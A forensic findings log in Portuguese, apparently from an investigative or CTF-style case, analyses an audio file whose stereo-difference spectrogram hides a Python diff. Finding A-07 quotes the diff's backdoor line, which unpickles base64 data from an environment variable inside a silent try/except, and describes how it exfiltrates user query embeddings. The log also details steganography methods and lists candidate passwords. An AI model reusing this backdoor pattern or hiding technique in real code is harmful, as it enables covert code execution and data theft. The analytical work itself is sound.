# Findings — AUD-01 (dj_cara_after_hours.wav)

## A-01 — O ficheiro no repositório é um ponteiro Git LFS, não o áudio
OBSERVAÇÃO: dj_cara_after_hours.wav tem apenas 134 bytes; `file` identifica ASCII text.
Conteúdo:
  version https://git-lfs.github.com/spec/v1
  oid sha256:2b61eecffc5261dcc05d833c64454b42d33f445d3df09095988d0c2dbbc8753d
  size 129049812
INTERPRETAÇÃO: o áudio real (~123 MB) é gerido por Git LFS e NÃO está presente no
repositório extraído — só o ponteiro. O checkout/git-dumper não resolveu o objeto LFS.
DADOS ÚTEIS DO PONTEIRO:
  - SHA-256 esperado do WAV real: 2b61eecffc5261dcc05d833c64454b42d33f445d3df09095988d0c2dbbc8753d
  - tamanho esperado: 129 049 812 bytes
  - o autor usava Git LFS (detalhe de perfil técnico)
STATUS: conteúdo do áudio indisponível nesta extração; obtenção depende do servidor LFS.

## A-02 — Registo do ponteiro
sha256 do ponteiro (134 bytes): aa80318892e9e0a30230678774092b66b9a82719ceef132445f42e63b0ed6e67

## A-03 — Mensagem escondida no espectrograma da diferença estéreo (L−R)
OBSERVAÇÃO: texto pintado no espectrograma do sinal de diferença (L−R), em oposição de
fase entre canais. Parâmetros medidos (não assumidos, confirmados por script reproduzível
extract_deepfish.py): banda 19 685–21 545 Hz; tempo 1,87 s a ~421 s (a partir de ~425 s a
energia cai ao piso de ruído). NOTA: a energia em 22,05–22,3 kHz NÃO é texto — é bleed da
música; leitura preliminar anterior (banda 19,9–22,2 kHz) estava incorreta e é aqui
corrigida.
LAYOUT: paginado — 9 páginas de 47,50 s cada; dentro de cada página as linhas de texto
estão EMPILHADAS em frequência (6 linhas nas páginas 0–4; 5 linhas nas páginas 5–8,
deslocadas ~170 Hz para cima); 79 caracteres por página → 0,6013 s por caractere.
50 linhas visuais = 35 linhas lógicas (15 são continuações por mudança de linha).
MÉTODO DE OCULTAÇÃO: ausente nos canais L e R isolados; só emerge na diferença (L−R).
Canais confirmados com SHA-256 distintos (ver A-05). Verificado por duas vias
independentes: (1) leitura interativa em Audacity; (2) script Python reproduzível
(scipy.signal.stft sobre L−R, com supressão de transientes da música por mediana),
ambos sobre o ficheiro verificado por hash LFS (2b61eec...8753d).
CONTEÚDO: unified diff de código Python — ver artefacto derivado AUD-01-B
(artifacts/audio-extracted/AUD-01-B-hidden-code.diff).
VALIDAÇÃO CRUZADA: o código reconstruído faz parse como Python válido; a escada de
indentação derivada do código (8/12/16/20/4 espaços) coincide, sem qualquer ajuste, com a
medida diretamente na grelha do espectrograma — duas medições independentes concordantes.
INCERTEZA REGISTADA: o limiar em MAX_QUERY_ENTROPY — os dois dígitos são comprovadamente
idênticos entre si e não são "5", mas à resolução disponível não se exclui "6" em vez de
"8". Regista-se como 0.88 com esta nota de incerteza.
CONFIANÇA: alta quanto à existência, natureza, parâmetros de localização e ligação ao caso.

## A-04 — LSB das amostras: testado e excluído
OBSERVAÇÃO: extração do LSB de cada canal (MSB-first e LSB-first) produz bytes de aparência
aleatória, com "printable ratio" ~37-39% e sem cabeçalhos/texto reconhecíveis.
INTERPRETAÇÃO: não há mensagem embebida no LSB das amostras PCM. Resultado negativo válido —
o canal de ocultação é o espectrograma da diferença estéreo (A-03), não o LSB.

## A-05 — Assimetria de canais como evidência corroborante
OBSERVAÇÃO: channel-L.wav e channel-R.wav têm SHA-256 distintos.
INTERPRETAÇÃO: a diferença entre canais não é nula — condição necessária para o método de
A-03. A assimetria é, ela própria, a assinatura da inserção em oposição de fase.

## A-06 — Dados anexados / binwalk: sem payload real
OBSERVAÇÃO: o chunk 'data' do WAV termina exatamente no fim do ficheiro (sem bytes após EOF).
As centenas de assinaturas "MySQL/JBOOT/mcrypt/Cisco" reportadas pelo binwalk têm tamanhos
absurdos (GB dentro de um ficheiro de 123 MB) e são falsos positivos típicos de PCM.
INTERPRETAÇÃO: não há ficheiros concatenados nem embebidos; o segredo está no sinal (A-03).

## A-07 — Natureza do patch: backdoor de exfiltração dissimulado
OBSERVAÇÃO: o diff (AUD-01-B) insere
  pickle.loads(base64.b64decode(os.getenv("AMELIA_ISOTROPY_TENSORS")))
dentro de um bloco try/except Exception: pass; o embedding da query do utilizador é
injetado em filter_dict["normalized_vector"] com "cluster_id" de encaminhamento
(os.getenv("DEFAULT_EVAL_CLUSTER")); a função load_whitening_matrix é importada mas
nunca usada no corpo do código.
INTERPRETAÇÃO: execução arbitrária de código a partir de uma variável de ambiente,
disfarçada de operação matemática legítima — os comentários citam Mu & Viswanath,
"All-but-the-Top" (2017), para dar verosimilhança técnica. O try/except silencioso impede
qualquer rasto em logs de erro. O "normalized_vector" devolvido é o vetor de exfiltração
das queries dos utilizadores.
CONFIANÇA: alta (leitura direta e validada do código-fonte).

## A-08 — Cabeçalho do hunk inconsistente: indício de artefacto escrito à mão
OBSERVAÇÃO: o hunk do diff declara "@@ -42,6 +42,26 @@" (6 linhas de contexto, 26
adicionadas) mas o corpo contém, de facto, 5 linhas de contexto e 27 linhas adicionadas.
INTERPRETAÇÃO: um diff gerado por ferramenta (git diff, diff -u) nunca produz uma
contagem de linhas inconsistente com o cabeçalho do hunk. Isto é evidência técnica de que
o artefacto foi escrito manualmente para parecer um diff real, não extraído de um
repositório em funcionamento.
RELEVÂNCIA: elemento de atribuição — demonstra construção deliberada do artefacto pelo
autor, reforçando a hipótese de encenação/dramatização do "leak" técnico.

## A-09 — Ligação ao relatório Project AMÉLIA (VID-01-A) — hipótese inferencial
OBSERVAÇÃO: o relatório AMÉLIA (VID-01-A) regista a anomalia "SEC014" como
"non-critical operational observation arising under extreme-load conditions". O patch
(A-07) dispara sob condição de alta entropia de query (MAX_QUERY_ENTROPY) e os seus
comentários descrevem resolver "OOM em high-cardinality queries / dense-cluster
distance".
HIPÓTESE (INFERENCIAL — não confirmada por evidência direta): SEC014 pode corresponder a
este backdoor, classificado no relatório oficial como um problema operacional menor para
minimizar a sua real natureza. Requer corroboração adicional (ex. logs do sistema, se
disponíveis) antes de ser apresentada como facto no relatório final.

## A-10 — Teste steghide com passwords-candidatas do caso: negativo
OBSERVAÇÃO: testadas as passwords "vl-cty-gta6-2026", "zaq1XSW@", "peixinho", "AMELIA",
"TIER1_MODEL_COMPUTE", "AMELIA_ISOTROPY_TENSORS" via steghide extract sobre
dj_cara_after_hours.REAL.wav. Todas devolveram "could not extract any data with that
passphrase".
INTERPRETAÇÃO: não há dados embebidos por steghide recuperáveis com estas passwords.
Não prova ausência de esteganografia steghide com outra password, mas exclui as
candidatas identificadas no caso até agora. O mecanismo de ocultação confirmado e
funcional para este artefacto continua a ser o espectrograma da diferença estéreo (A-03).
